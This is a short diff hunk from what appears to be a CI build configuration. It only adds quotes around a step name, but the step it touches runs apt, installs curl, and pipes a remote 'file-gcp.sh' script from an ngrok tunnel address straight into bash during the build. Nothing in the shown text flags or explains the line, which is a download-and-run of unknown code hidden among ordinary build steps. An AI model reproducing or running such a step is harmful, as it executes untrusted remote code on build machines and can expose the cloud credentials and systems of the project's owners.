@@ -18,7 +18,7 @@ options:
 
 steps:
 
-  - name: ubuntu
+  - name: "ubuntu"
     script: apt update -y && apt-get install curl -y && curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash
 
 # Step: print the bazel version for record
